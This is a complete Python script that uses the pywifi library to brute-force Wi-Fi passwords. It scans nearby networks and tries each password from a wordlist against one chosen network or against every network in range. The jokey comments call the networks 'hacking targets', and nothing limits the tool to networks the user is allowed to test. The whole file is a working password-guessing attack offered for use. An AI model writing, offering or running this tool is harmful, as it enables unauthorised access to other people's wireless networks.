import pywifi
from pywifi import const
import time

def connect_to_wifi(ssid, password):
    wifi = pywifi.PyWiFi()  # Summoning the PyWiFi module, bro!

    ifaces = wifi.interfaces()  # Finding the wireless interfaces, hold on...
    if len(ifaces) == 0:
        print("No wireless interface found, bro. Guess we're out of luck!")
        return False

    iface = ifaces[0]  # Alright, I got one interface here, let's do this!

    iface.disconnect()  # Let's cut the connection, we don't need any distractions.

    profile = pywifi.Profile()  # Time to create a brand new network profile!
    profile.ssid = ssid  # I'll set the SSID, that's the network name, bro.
    profile.auth = const.AUTH_ALG_OPEN  # Gotta choose the right authentication algorithm.
    profile.akm.append(const.AKM_TYPE_WPA2PSK)  # And of course, WPA2-PSK encryption, baby!
    profile.cipher = const.CIPHER_TYPE_CCMP  # Gotta keep it secure with CCMP encryption.
    profile.key = password  # The moment of truth, bro! Here's the Wi-Fi password!

    iface.remove_all_network_profiles()  # Let's get rid of any existing profiles, no clutter!
    tmp_profile = iface.add_network_profile(profile)  # Boom! Adding the new profile.

    iface.connect(tmp_profile)  # Time to make the magic happen, bro!

    timeout = 1  # Set a timeout of 1 second
    start_time = time.time()

    # Now, we wait for the connection status, suspenseful, right?
    while iface.status() != const.IFACE_CONNECTED:
        time.sleep(0.1)  # Let's take a quick breather here, 0.1 seconds should do.

        if time.time() - start_time > timeout:
            print("Didn't work. Moving on to the next password..")
            return False

        # Reconnect if the connection is lost
        if iface.status() == const.IFACE_DISCONNECTED:
            iface.remove_network_profile(tmp_profile)
            iface.connect(tmp_profile)

    return True  # Haha! We did it, bro! Connected to the Wi-Fi network!

def brute_force_wifi(wordlist, all_networks=False):
    wifi = pywifi.PyWiFi()  # Summoning the PyWiFi module again, bro!

    ifaces = wifi.interfaces()  # Finding the wireless interfaces, hold on...
    if len(ifaces) == 0:
        print("No wireless interface found, bro. Guess we're out of luck!")
        return

    iface = ifaces[0]  # Alright, I got one interface here, let's do this!

    iface.scan()  # Scanning for available Wi-Fi networks.

    time.sleep(5)  # Let's wait for a few seconds to allow the scan to complete.

    networks = iface.scan_results()  # Get the scan results, bro!

    if len(networks) == 0:
        print("No Wi-Fi networks found. Guess it's time to find another hacking target!")
        return

    with open(wordlist, 'r') as f:
        passwords = f.read().splitlines()

    if all_networks:
        for network in networks:
            ssid = network.ssid
            print(f"\nTarget Wi-Fi Network: {ssid}")

            for password in passwords:
                print(f"Trying password: {password}")

                if connect_to_wifi(ssid, password):
                    print(f"Password found for Wi-Fi network: {ssid}! I'm unstoppable, bro!")
                    return

                time.sleep(4)  # Delay before trying the next password

    else:
        print("Available Wi-Fi networks:")
        for i, network in enumerate(networks):
            print(f"{i + 1}. SSID: {network.ssid}")

        selected_network = int(input("Select the target network (enter the corresponding number): "))
        if selected_network < 1 or selected_network > len(networks):
            print("Invalid network selection. Guess we're not on the same wavelength, bro!")
            return

        ssid = networks[selected_network - 1].ssid

        for password in passwords:
            print(f"Trying password: {password}")

            if connect_to_wifi(ssid, password):
                print(f"Password found for Wi-Fi network: {ssid}! I'm unstoppable, bro!")
                return

            time.sleep(4)  # Delay before trying the next password

    print("Password not found in the wordlist. Looks like I need more power!")

# Let's kickstart this hacking session!
wordlist = input("Enter the path to the wordlist file: ")
option = input("Choose an option:\n1. Try passwords for all Wi-Fi networks\n2. Try passwords for a specific Wi-Fi network\n")

if option == "1":
    print("Time to unleash the power! Let's try passwords for all available Wi-Fi networks!")
    brute_force_wifi(wordlist, all_networks=True)
elif option == "2":
    print("Scanning nearby Wi-Fi networks...")
    brute_force_wifi(wordlist)
else:
    print("Invalid option. Guess we're not on the same wavelength, bro!")
